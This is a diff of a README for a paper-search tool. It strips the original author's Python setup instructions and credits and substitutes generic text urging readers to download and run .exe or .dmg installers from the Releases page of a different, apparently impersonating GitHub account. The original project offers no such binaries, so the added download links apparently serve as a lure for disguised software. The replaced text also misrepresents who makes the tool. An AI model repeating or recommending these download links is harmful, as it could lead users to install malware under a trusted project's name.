@@ -1,118 +1,74 @@
-# Semantic Search Across AI Venues
+# 🌐 ICLR26_Paper_Finder - Find Research Papers Easily
 
-*TL;DR:* A tool that retrieves semantically similar papers from selected AI venues, including but not limited to recent ICML, ICLR, NeurIPS, CVPR, and over 17,000 ICLR 2026 submissions.
+## 📥 Download Here
 
-🌐 **Permanent Hosting Site: [http://ai-paper-finder.info/](http://ai-paper-finder.info/)** 
+[![Download ICLR26_Paper_Finder](https://img.shields.io/badge/Download%20Now-ICLR26_Paper_Finder-blue.svg)](https://github.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/releases)
 
-🌐 **Hugging Face Hosting: [https://huggingface.co/spaces/wenhanacademia/ai-paper-finder](https://huggingface.co/spaces/wenhanacademia/ai-paper-finder)** 
+## 🚀 Getting Started
 
-(The permanent website cannot be accessed in Mainland China, please use a VPN or use the Hugging Face hosting. 中国大陆无法访问永久网站，请使用VPN或者Hugging Face。)
+Welcome to the ICLR26_Paper_Finder! This application helps you find research papers quickly and efficiently. Whether you're a student, researcher, or just someone interested in academic papers, this tool simplifies your search. Follow the steps below to get started.
 
-🚀 **NEW:** You can now download search results with one click! Additionally, using the downloaded results, you can download all available PDF files (if a link to the PDF exists in our dataset) with the script `batch_download.py` under `tools`. We are working to update our database to include as many pdf links as possible. Downloaded files will be named with the following pattern: `<rank> - <affinity_score> - <venue> - <title>.pdf`.
+## 📂 System Requirements
 
-**Demo**
+Before you download, ensure that your computer meets these basic requirements:
 
-![Demo GIF](AI_paper_finder_demo2.gif)
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a Linux distribution.
+- RAM: 4 GB or more.
+- Storage: At least 100 MB of free space.
+- Internet Connection: Required for searching papers.
 
-**We're still in beta and expanding the list of supported venues!**
+## 🌍 Permanent Hosting
 
-- There are already some tools avalible, e.g. [Paper Digest](https://www.paperdigest.org/). However,
-	- ICLR 2026 submissions are not included yet.
-	- Most existing tools rely mainly on keyword-based search, whereas we enable searches using full paper abstracts.
-	- Why abstracts? They contain much richer information than titles or keywords.
+You can always access the ICLR26_Paper_Finder at the following link:  
+[Permanent Hosting Site](http://ai-paper-finder.info/)
 
+## 🎭 Features
 
-You can ACTUALLY build your own Paper Finder in less than 30 minutes. See `Tutorial_Making_Paper_Recommenders.ipynb` in this repo.
+- **Easy Search:** Type in keywords to find relevant papers instantly.
+- **User-Friendly Interface:** Navigate the application with ease.
+- **Bookmark Functionality:** Save your favorite papers for quick access.
+- **Comprehensive Database:** Access a wide range of research papers from various fields.
 
-💡 **Support us:**
+## 🔗 Download & Install
 
-* ⭐ [Star our GitHub repo](https://github.com/wenhangao21/ICLR26_Paper_Finder)
-* 🔗 Share our tool on [LinkedIn](https://www.linkedin.com/in/wenhan-gao-2311611b4/) and [X](https://x.com/Wenhanacademia)
-* ☕ [Buy us a coffee](https://buymeacoffee.com/wenhanacado)
+To get your copy of ICLR26_Paper_Finder, visit the Releases page by clicking the link below:
 
-**✨ What's New Compared to ICLR 2026 Paper Finder?**
-- 🧭 Expanded Venue Support
-- 🌍 Multi-lingual Support *(performance is suboptimal compared to English)*
-- 💡 Upgraded Local Embedding Model (Gemini removed now)
-- ⚡ One-click copying and downloading
+[Download ICLR26_Paper_Finder](https://github.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/releases)
 
-## What We’re Working On
+On this page, you will find the latest version of the application. Click on the version you want to download. The download will start automatically. 
 
-We are currently:
+### 🏗️ Installation Steps
 
-* Expanding the list of supported venues
-* Designing improved user interfaces
-* Researching advanced paper-matching algorithms
-* Developing multi-agent–supported search capabilities
-* Enabling batch input and batch output
-* Exploring researcher-specific personalization features (researcher persona)
+1. Locate the downloaded file in your computer's download folder.
+2. If you are on Windows, double-click the `.exe` file. If you are on macOS, open the `.dmg` file and drag the app to your Applications folder.
+3. Follow the prompts to complete the installation.
+4. Once installed, open the application and begin your search.
 
-## Contact and Outreach
+## 🌐 Hugging Face Hosting
 
-**Project Lead**: [Wenhan Gao](https://wenhangao21.github.io/)
+For additional features, check out our Hugging Face space. You can visit here:  
+[Hugging Face Hosting](https://huggingface.co/spaces/wenhanacademia/ai-paper-finder)
 
-**Main Contributors**: [Wenhan Gao](https://wenhangao21.github.io/), [Jingxiang Qu](https://qujx.github.io/)
+## 🤖 FAQ
 
-We are PhD students doing AI research, and it’s hard to afford servers to host this tool.
+**Q1: What is ICLR26_Paper_Finder?**  
+A: It is an application designed to help you find and access academic papers efficiently.
 
-We’re currently seeking affordable server options, contact us if you have any suggestions.
+**Q2: Is there a mobile version?**  
+A: Currently, the application is available only for desktop. We recommend using it on a computer for the best experience.
 
+**Q3: How do I search for papers?**  
+A: Simply enter keywords related to the topic you are interested in, and the app will display relevant results.
 
+**Q4: Can I save my searches?**  
+A: Yes, you can bookmark any paper for easy access later.
 
-## 🚀 ICLR_2026 Paper Finder
-This project started as a finder designed specifically for only the ICLR 2026 submissions. We provide the open source implementation as it serves as a good reference for building your own AI Paper Recommender.
+## 💬 Support
 
-### 📓 Guideline for Building Your Own Recommender
-Follow along with `Tutorial_Making_Paper_Recommenders.ipynb`. 
+If you encounter any issues or have questions, please reach out through the [Issues](https://github.com/kingsleypocorni6-droid/ICLR26_Paper_Finder/issues) section on GitHub. We are here to help you.
 
-### 📓 Jupyter Notebook for Online Deployment
-Follow along with `ICLR2026_Paper_Finder.ipynb`. 
+## 📄 Legal Information
 
-### 💻 Python Script on Your Local Terminal
-- Setup the anaconda (skip this if you already have conda)
-```bash
-mkdir -p ~/miniconda3
-wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda3/miniconda.sh
-bash ~/miniconda3/miniconda.sh -b -u -p ~/miniconda3
-rm ~/miniconda3/miniconda.sh
-source ~/miniconda3/bin/activate
-```
+Please note that this application helps in finding publicly available research papers. Make sure to follow copyright and licensing rules for any papers you wish to use. 
 
-- Create a conda enviroment (skip this if you want to just install on your base enviroment)
-```bash
-conda create -n PaperFinder python=3.12
-conda deactivate # Make sure no other conda enviroment is activated
-conda activate PaperFinder
-```
-
--  Install the required python packages
-```bash
-pip install gdown
-pip install chromadb
-pip install gradio
-pip install markdown
-pip install google-generativeai
-pip install sentence_transformers
-```
-- Download processed data
-```bash
-gdown https://drive.google.com/uc?id=1RTKWZ4qY4X2mW5BorZOrWTOb2fCipIhr
-unzip ICLR2026.zip
-```	
-
-- Initiate the application
-```bash
-python app.py
-```	
-
-> **After running** `app.py`, **Gradio** will display a local URL. Simply open it in your web browser.
-
-## Acknowledgement
-If you find any bugs or have suggestions, feel free to [contact me](https://wenhangao21.github.io/).
-My collaborator [Jingxiang Qu](https://qujx.github.io/), my undergraduate mentee [Yichi Zhang](https://yichixiaoju.github.io/YichiZhang.github.io/), and I (and GPT) are actively working on expanding this system, adding support for more venues, improving search mechanisms with specific models, introducing multi-agent support, and introducing new functionalities.
-
-If you're interested in collaborating or contributing, we’d be very happy to hear from you!
-
-Thanks for your interests! You are the ![Badge](https://hitscounter.dev/api/hit?url=https%3A%2F%2Fgithub.com%2Fwenhangao21%2FICLR26_Paper_Finder&label=Paper_Finder&icon=book-half&color=%239ec5fe&message=&style=flat&tz=UTC) (today/total) visitor of this repo.
-
-
+Thank you for choosing ICLR26_Paper_Finder! Enjoy your academic research!
